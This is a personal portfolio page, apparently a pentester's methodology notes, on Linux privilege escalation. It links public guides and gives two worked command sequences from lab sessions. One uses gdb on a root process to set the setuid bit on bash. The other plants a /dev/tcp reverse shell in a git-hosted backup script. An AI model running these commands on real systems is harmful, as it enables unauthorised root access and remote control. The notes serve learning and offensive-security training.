@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="assets/css/method-styles.css">
+
+    <title>TITLE</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="#" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="#home" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="e09afef9-e3c5-4561-8c53-accaf51bc1b0" class="page sans"><header><h1 class="page-title">General</h1></header><div class="page-body"><p id="a6a65d10-460f-441a-a572-d3b132cf578d" class=""><strong>Linux Guides:</strong></p><ul id="43b89f22-f7c2-4210-901f-feef06a209dd" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sirensecurity.io/blog/linux-privilege-escalation-resources/"><strong>https://sirensecurity.io/blog/linux-privilege-escalation-resources/</strong></a></li></ul><ul id="74652950-b282-4e7d-a3ba-22174a7b1770" class="bulleted-list"><li style="list-style-type:disc"><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li></ul><ul id="4349e6cd-0663-4932-90f1-5b9b2b3ef7f8" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md</a></li></ul><ul id="27e2dc03-2eb7-4e58-a555-072eb39829e0" class="bulleted-list"><li style="list-style-type:disc"><a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist">https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist</a></li></ul><ul id="466c7e7b-4e6c-4e01-913c-8616af9519fb" class="bulleted-list"><li style="list-style-type:disc"><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html</a></li></ul><p id="bc9e8a75-004f-4ba3-9a1f-0f4ad9460fc6" class="">
+</p><p id="e6a80d93-57f0-4ea2-84ce-88c746883269" class="">
+</p><p id="d72eefda-40aa-4556-8dfc-0cfb5a51e543" class="">
+</p><p id="815f4a5f-a701-4169-8262-045c1bbeaf74" class="">Bash root process escalation:</p><pre id="3778509e-6e43-4a28-9201-9e36bf44ee3c" class="code"><code>developer@faculty:~$ ps faux | grep ^root | grep python3
+root   731   0.0  0.9  26896 18200   Ss   Jul02   0:00 /usr/bin/python3 .....
+developer@faculty:~$ gdb -p 731
+Attaching to process 731
+(gdb) call (void)system(&quot;chmod u+s /bin/bash&quot;)
+quit
+bash -p</code></pre><p id="e4fe4480-b36f-42da-99df-faf8cf0d1026" class="">Git:</p><pre id="dd784bca-a8cc-408e-87f7-34bfb57f0def" class="code"><code>GIT_SSH_COMMAND=&#x27;ssh -i id_rsa -p 43022&#x27; git clone gituser@0.0.0.0:/git-server
+cd git-server
+kali@kali:~/git-server$ git config --global user.name &quot;kali&quot;
+kali@kali:~/git-server$ git config --global user.email &quot;kali@kali.(none)&quot;
+#
+kali@kali:~/git-server$ echo &quot;sh -i &gt;&amp; /dev/tcp/192.168.118.8/8080 0&gt;&amp;1&quot; &gt;&gt; backups.sh 
+kali@kali:~/git-server$ chmod +x backups.sh
+#
+kali@kali:~/git-server$ GIT_SSH_COMMAND=&#x27;ssh -i ~/id_rsa -p 43022&#x27; git push origin master
+Enumerating objects: 5, done.
+Counting objects: 100% (5/5), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 302 bytes | 302.00 KiB/s, done.
+Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
+To 192.168.120.204:/git-server
+   b50f4e5..0212790  master -&gt; master
+kali@kali:~/git-server$</code></pre><p id="608c6d98-c498-49ab-9615-873e4fe68470" class="">
+</p></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="assets/js/main.js"></script>
+</body>
+</html>
